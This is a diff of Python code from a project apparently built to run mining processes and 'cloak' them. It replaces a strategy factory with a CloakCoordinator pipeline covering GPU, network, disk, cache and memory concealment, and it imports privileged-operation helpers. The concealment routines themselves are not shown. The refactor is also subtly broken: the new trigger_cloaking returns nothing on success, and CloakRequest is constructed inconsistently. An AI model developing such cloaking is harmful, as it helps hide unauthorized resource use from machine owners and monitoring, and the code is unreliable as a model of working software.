@@ -19,8 +19,8 @@ from pathlib import Path
 import os
 
 # Core project imports
-from mining_environment.scripts.utils import MiningProcess
-from mining_environment.scripts.resource_control import CloakStrategyFactory
+from mining_environment.scripts.utils import MiningProcess, CloakRequest, CloakResult
+from mining_environment.scripts.cloak_strategies import CloakCoordinator  # NEW: Use coordinator instead of factory
 from mining_environment.scripts.auxiliary_modules.interfaces import IResourceManager
 from mining_environment.scripts.auxiliary_modules.models import ConfigModel
 from mining_environment.scripts.privileged_operations import get_privileged_manager
@@ -151,44 +151,24 @@ class SharedResourceManager:
             return 0.0
 
     def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess):
-        """**Apply Cloaking Strategy** (áp dụng chiến lược che giấu)"""
+        """**Apply Cloaking Strategy** (áp dụng chiến lược che giấu)
+        
+        DEPRECATED: This method is replaced by the new linear pipeline.
+        Use trigger_cloaking() instead which uses CloakCoordinator.
+        """
+        self.logger.warning(f"[DEPRECATED] apply_cloak_strategy() is deprecated. Use trigger_cloaking() instead.")
+        
+        # Forward to new linear pipeline method
+        return self.trigger_cloaking(process, f'legacy_{strategy_name}')
+
+    def trigger_cloaking(self, process: MiningProcess, strategy_name: str):
+        """**Trigger Cloaking** (kích hoạt che giấu)"""
         try:
-            # CloakStrategyFactory.create_strategy is a static method
-            from .resource_control import CloakStrategyFactory
-            
-            # Prepare resource_managers dict
-            resource_managers = {'main': self}
-            
-            # Call static method with all required parameters
-            strategy = CloakStrategyFactory.create_strategy(
-                strategy_name=strategy_name,
-                config=self.config.__dict__ if hasattr(self.config, '__dict__') else self.config,
-                logger=self.logger,
-                resource_managers=resource_managers,
-                process_type='GPU'  # GPU-only implementation
-            )
-            
-            if strategy:
-                # Apply the strategy to the process
-                result = strategy.apply(process)
-                if result:
-                    self.logger.info(f"✅ [TIER-1] Applied {strategy_name} successfully for PID {process.pid}")
-                    
-                    # Log to gpu_cloaking.log if it's a GPU strategy
-                    if 'gpu' in strategy_name.lower():
-                        gpu_logger = logging.getLogger('gpu_cloaking')
-                        gpu_logger.info(f"✅ GPU Cloaking applied: {strategy_name} for PID {process.pid}")
-                    
-                    return True
-                else:
-                    self.logger.warning(f"⚠️ [TIER-1] Strategy {strategy_name} failed for PID {process.pid}")
-                    return False
-            else:
-                self.logger.error(f"❌ [TIER-1] Could not create strategy {strategy_name}")
-                return False
-                
+            cloak_request = CloakRequest(process, strategy_name)
+            cloak_result = self._execute_cloak_request(cloak_request)
+            return cloak_result.success
         except Exception as e:
-            self.logger.error(f"❌ [TIER-1] Error applying strategy {strategy_name}: {e}")
+            self.logger.error(f"❌ [TIER-1] Error in cloaking pipeline: {e}")
             import traceback
             self.logger.debug(f"Traceback: {traceback.format_exc()}")
             return False
@@ -441,32 +421,39 @@ class ResourceManager(IResourceManager):
             self.logger.error(f"Lỗi xử lý process registration: {e}")
 
     def trigger_cloaking(self, process: MiningProcess, source: str = 'unknown') -> bool:
-        """Enhanced trigger cloaking with comprehensive strategy application"""
-        self.logger.info(f"🎯 [TRIGGER-CLOAKING] Called for PID {process.pid} from source: {source}")
+        """Simplified trigger cloaking using new linear pipeline"""
         try:
-            self.logger.info(f"Trigger cloaking called for PID {process.pid} from source: {source}")
-            self.logger.info(f"Process details: name={process.name}, cmd={process.cmd}")
+            self.logger.info(f"[RM] Stage 1: Trigger cloaking for PID {process.pid} from source: {source}")
             
-            # Ensure SharedResourceManager is available
-            if not self._ensure_shared_resource_manager():
-                self.logger.warning("SharedResourceManager unavailable, skipping cloaking")
-                return False
-
-            # Determine cloaking strategies for this process
-            strategies = self._determine_strategies(process)
-            self.logger.info(f"Determined strategies: {strategies}")
+            # Ensure we have a coordinator
+            if not hasattr(self, 'cloak_coordinator'):
+                self.cloak_coordinator = CloakCoordinator(self.config)
+                self.logger.info("[RM] Initialized CloakCoordinator")
             
-            if not strategies:
-                self.logger.warning(f"No strategies available for PID {process.pid}")
-                return False
+            # Stage 1: Create MINIMAL request - chỉ PID & metadata
+            # KHÔNG quyết định strategy, KHÔNG prepare params!
+            request = CloakRequest(
+                pid=process.pid,
+                strategy_name=None,  # Let Stage 2 decide based on config
+                params={},           # Let Stage 2 prepare based on strategy
+                metadata={'source': source, 'process_name': process.name}
+            )
             
-            # Apply each available strategy
-            return self._apply_strategies(process, strategies)
-                    
+            self.logger.info(f"[RM] Created minimal request for PID {process.pid}")
+            
+            # Stage 2: Forward to coordinator
+            result = self.cloak_coordinator.process_request(request)
+            
+            if result.success:
+                self.logger.info(f"[RM] ✅ Cloaking successful for PID {process.pid}")
+                self.logger.info(f"[RM] Applied controls: {result.applied_controls}")
+            else:
+                self.logger.error(f"[RM] ❌ Cloaking failed: {result.error_msg}")
+            
         except Exception as e:
-            self.logger.error(f"Error triggering cloaking for PID {process.pid}: {e}")
+            self.logger.error(f"[RM] Exception in trigger_cloaking: {e}")
             import traceback
-            self.logger.debug(f"Full traceback: {traceback.format_exc()}")
+            self.logger.debug(f"[RM] Traceback: {traceback.format_exc()}")
             return False
 
     def _apply_strategies(self, process: MiningProcess, strategies: List[str]) -> bool:
@@ -533,26 +520,12 @@ class ResourceManager(IResourceManager):
     def _is_strategy_available(self, strategy_name: str) -> bool:
         """Check if the specified strategy is available for use"""
         try:
-            # Attempt to create strategy instance to verify availability
-            from .resource_control import CloakStrategyFactory
-            
-            # Prepare parameters for strategy creation
-            resource_managers = {'main': self}
-            config_data = self.config.__dict__ if hasattr(self.config, '__dict__') else self.config
-            
-            # Try to create strategy instance
-            strategy = CloakStrategyFactory.create_strategy(
-                strategy_name=strategy_name,
-                config=config_data,
-                logger=self.logger,
-                resource_managers=resource_managers,
-                process_type='GPU'
-            )
-            
-            return strategy is not None
+            # Simple validation of known strategy names
+            known_strategies = ['gpu', 'network', 'disk_io', 'cache', 'memory']
+            return strategy_name.lower() in known_strategies
             
         except Exception as e:
-            self.logger.debug(f"Strategy '{strategy_name}' not available: {e}")
+            self.logger.debug(f"Strategy '{strategy_name}' validation error: {e}")
             return False
 
     def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
